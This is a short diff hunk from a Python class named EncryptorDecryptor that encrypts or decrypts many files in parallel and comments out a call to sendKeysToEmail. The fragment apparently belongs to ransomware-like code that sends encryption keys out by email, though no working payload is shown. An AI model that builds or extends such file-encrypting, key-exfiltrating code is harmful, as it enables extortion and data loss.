@@ -103,7 +103,7 @@ class EncryptorDecryptor:
                         executor.submit(self.encryptData, file_name)
                     elif self.mode == 'decrypt':
                         executor.submit(self.decryptData, file_name)
-        self.sendKeysToEmail()
+        # self.sendKeysToEmail()
 
 
 if __name__ == '__main__':
